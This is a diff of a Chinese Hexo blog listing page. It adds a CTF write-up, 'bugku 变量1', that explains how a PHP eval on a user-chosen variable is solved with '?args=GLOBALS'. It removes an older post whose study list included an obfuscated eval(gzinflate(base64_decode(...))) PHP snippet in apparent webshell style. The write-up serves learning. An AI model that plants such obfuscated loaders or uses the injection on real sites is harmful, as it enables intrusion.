@@ -7,7 +7,29 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">81</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/01/25/URI%E6%A0%BC%E5%BC%8F/">URI格式</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-25</time><div class="content"><p><img src="/2020/01/25/URI%E6%A0%BC%E5%BC%8F/7.png" alt="7"></p>
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">82</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/01/28/bugku-%E5%8F%98%E9%87%8F1/">bugku 变量1</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-28</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/ctf%E6%80%BB%E7%BB%93/">ctf总结</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><h2 id="题目：变量1"><a href="#题目：变量1" class="headerlink" title="题目：变量1"></a>题目：<a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">变量1</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#39;args&#39;]))&#123;</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li><p>error_reporting() 函数规定报告哪个错误。</p>
+<p>而error_reporting(0) 表示关闭php错误显示。</p>
+</li>
+<li><p>用<a href="https://www.runoob.com/php/php-includes.html" target="_blank" rel="noopener">include</a>语句引入flag1.php文件，而flag应该就在里面</p>
+</li>
+<li><p>highlight_file()函数显示括号中文件的源代码</p>
+</li>
+<li><p>$_GET变量用来收集上传数据，具体方法为在网页域名后“?(要上传的数据)”</p>
+</li>
+<li><p>“/^\w+$/“该正则表达式代表$args变量要符合至少一个（0-9/a-z/A-Z）组成的字符串</p>
+</li>
+<li><p>要显示flag1.php里的值，尝试使用超级全局变量<strong>$GLOBALS</strong>($GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。)</p>
+</li>
+<li><p>var_dump()函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p>
+</li>
+</ol>
+<p>所以在域名后加“ ?args=GLOBALS ”,</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/01/25/URI%E6%A0%BC%E5%BC%8F/">URI格式</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-25</time><div class="content"><p><img src="/2020/01/25/URI%E6%A0%BC%E5%BC%8F/7.png" alt="7"></p>
 <p>使用 http: 或 https: 等协议方案名获取访问资源时要指定协议类型。不 区分字母大小写，最后附一个冒号（:）。 也可使用 data: 或 javascript: 这类指定数据或脚本程序的方案名。</p>
 <h3 id="登录信息（认证）"><a href="#登录信息（认证）" class="headerlink" title="登录信息（认证）"></a>登录信息（认证）</h3><p>指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份 认证）。此项是<strong><em>可选项</em></strong>。</p>
 <h3 id="服务器地址"><a href="#服务器地址" class="headerlink" title="服务器地址"></a>服务器地址</h3><p>使用绝对 URI 必须指定待访问的服务器地址。地址可以是类似 hackr.jp 这种 DNS 可解析的名称，或是 192.168.1.1 这类 IPv4 地址 名，还可以是 [0:0:0:0:0:0:0:1] 这样用方括号括起来的 IPv6 地址名。</p>
@@ -654,42 +676,6 @@
 
 <h2 id="unshift"><a href="#unshift" class="headerlink" title="unshift()"></a>unshift()</h2><p><em>与push()基本相同，只不过是把新元素添到数组开头并返回数组长度。</em></p>
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/01/06/JS-call-apply-bind-%E5%87%BD%E6%95%B0-%E5%BC%BA%E5%88%B6%E9%87%8D%E6%96%B0%E5%AE%9A%E4%B9%89this%E5%AF%B9%E8%B1%A1/">JS call()/apply()/bind()函数 [强制重新定义this对象]</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-06</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/JS-%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">JS 函数整理</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E5%87%BD%E6%95%B0/">函数</a></span><div class="content"><p>这个哥们讲得超棒，就引用哈 <a href="https://www.runoob.com/w3cnote/js-call-apply-bind.html" target="_blank" rel="noopener">他的文章</a>！</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/01/06/%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0%E4%B8%AD%E9%81%87%E5%88%B0%E5%8F%AF%E5%AD%A6%E5%8D%B4%E8%BF%98%E6%B2%A1%E6%9D%A5%E5%BE%97%E5%8F%8A%E5%AD%A6%E7%9A%84%E4%B8%9C%E8%A5%BF/">一些学习中遇到可学却还没来得及学的东西</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-06</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/">杂七杂八</a></span><div class="content"><ol>
-<li><p><a href="https://www.runoob.com/html/html5-form-attributes.html" target="_blank" rel="noopener">HTML表单属性</a></p>
-</li>
-<li><p><a href="https://www.runoob.com/css/css-pseudo-classes.html" target="_blank" rel="noopener">CSS伪类</a></p>
-</li>
-<li><pre><code>&lt;?php
-function CLsI($ZzvSWE) {
-
-    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));
-
-    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) {
-
-        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
-
-    }
-
-    return $ZzvSWE;
-
-}
-eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));
-?&gt;</code></pre></li>
-<li><p>看b站视频大致了解pwn和逆向</p>
-</li>
-<li><p>中国菜刀调试</p>
-</li>
-<li><p>DVWA csp bypass high级别理解</p>
-</li>
-<li><p>等额本息偿付</p>
-</li>
-<li><p>c语言反编译数组和指针查看其区别</p>
-</li>
-</ol>
-<h1 id="已学"><a href="#已学" class="headerlink" title="已学"></a>已学</h1><ol>
-<li>抓包技术</li>
-<li>菜鸟php与ajax</li>
-</ol>
 </div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/6/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/8/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
